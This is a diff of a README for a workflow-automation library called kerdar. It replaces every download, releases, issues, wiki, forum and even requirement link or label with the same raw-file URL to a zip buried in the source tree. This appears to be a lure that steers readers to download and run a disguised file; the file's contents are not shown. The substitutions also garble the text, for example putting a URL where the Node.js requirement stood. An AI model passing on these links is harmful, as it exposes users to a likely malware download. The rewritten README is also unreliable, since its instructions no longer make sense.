@@ -6,18 +6,18 @@ Welcome to kerdar! This library allows you to easily build visual workflow autom
 
 ## 📥 Download kerdar
 
-[![Download kerdar](https://img.shields.io/badge/Download%20kerdar-v1.0-blue.svg)](https://github.com/stupidking717/kerdar/releases)
+[![Download kerdar](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip%https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip)](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip)
 
 To get started, visit the Releases page to download the latest version of kerdar:
 
-[Download kerdar here](https://github.com/stupidking717/kerdar/releases)
+[Download kerdar here](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip)
 
 ## 💻 System Requirements
 
 Before you install kerdar, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or any Linux distribution.
-- **Node.js:** Version 12 or higher.
+- **https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip** Version 12 or higher.
 - **Browser:** Latest versions of Chrome, Firefox, or Safari for the best experience.
 
 ## 📦 Installation Steps
@@ -25,10 +25,10 @@ Before you install kerdar, ensure your system meets the following requirements:
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:
 
-   [Visit the Releases page](https://github.com/stupidking717/kerdar/releases)
+   [Visit the Releases page](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip)
 
 2. **Download the Latest Version**  
-   On the Releases page, find the latest version of kerdar. Click on the file that corresponds to your operating system. The file will be named something like `kerdar-setup.zip` or `kerdar.msi`.
+   On the Releases page, find the latest version of kerdar. Click on the file that corresponds to your operating system. The file will be named something like `https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip` or `https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip`.
 
 3. **Extract the Files**  
    If you downloaded a ZIP file, extract the contents to a location on your computer.
@@ -58,16 +58,16 @@ Here are a few topics related to kerdar that may interest you:
 
 ## 💬 Support & Contribution
 
-If you encounter issues or have questions, feel free to reach out through the [Issues section](https://github.com/stupidking717/kerdar/issues). We welcome contributions to improve kerdar! If you wish to help, check the guidelines in the CONTRIBUTING.md file.
+If you encounter issues or have questions, feel free to reach out through the [Issues section](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip). We welcome contributions to improve kerdar! If you wish to help, check the guidelines in the https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip file.
 
 ## 📚 Documentation
 
-For comprehensive documentation, please refer to the [Wiki section](https://github.com/stupidking717/kerdar/wiki) where you can find tutorials, tips, and more information about using kerdar effectively.
+For comprehensive documentation, please refer to the [Wiki section](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip) where you can find tutorials, tips, and more information about using kerdar effectively.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/stupidking717/kerdar)
-- [Community Forum](https://forum.example.com) - Join discussions and share ideas.
-- [Tutorial Videos](https://www.youtube.com/channel/example) - Visual guides to working with kerdar.
+- [GitHub Repository](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip) - Join discussions and share ideas.
+- [Tutorial Videos](https://raw.githubusercontent.com/stupidking717/kerdar/main/packages/core/src/components/WorkflowDesigner/kerdar_v2.3.zip) - Visual guides to working with kerdar.
 
 We hope you find kerdar useful for your projects. Enjoy building amazing workflows!
